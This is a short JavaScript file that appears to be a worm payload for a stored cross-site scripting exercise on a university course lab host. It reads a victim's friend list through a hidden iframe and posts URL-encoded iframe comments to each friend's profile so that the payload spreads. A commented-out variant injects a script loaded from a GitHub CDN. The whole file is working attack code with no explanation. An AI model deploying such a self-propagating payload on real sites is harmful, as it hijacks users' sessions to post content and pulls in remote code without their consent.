function moveitmoveit() {
    var eff = document.getElementById("hiddenone");
    eff.addEventListener("load",function(){
       var conter= eff.contentWindow.document.body.innerHTML.match('^[^<br]*');
       var stringy = conter.join();
       var arr = stringy.split(',');
       for( var i = 0; i < arr.length; i++){
           // alert(arr[i]);
           var stringFrame = "%3Ciframe%20id%3D%27hiddenone%27%20src%3D%27http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Ffriends.php%27%3E%3C%2Fiframe%3E%22%3E%3C%2Fiframe%3E";
           var frameComment = "%3Ciframe%20style%3D%22display%3A%20none%22%20src%3D%22http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Fadd_comment.php%3Fid%3D"+i+"%26comment%3D"+stringFrame;
           document.getElementById('iframe').innerHTML =frameComment;
           alert("done");
           //var string1 = "https://csec380-core.csec.rit.edu:86/add_friend.php?id=101";
           //var string = "%3Ciframe%20style%3D%22display%3A%20none%22%20src%3D%22http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Fadd_comment.php%3Fid%3D"+num+"%26comment%3D%3Cscript%20src%3D%27https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FDarkLemon27%2FWebApp%40latest%2Ffriend.js%27%3E%3C%2Fscript%3E%3E%3C%2Fiframe%3EHello%20Young%27nsgss";
           //document.write(string);
       } 
   });
}
moveitmoveit();
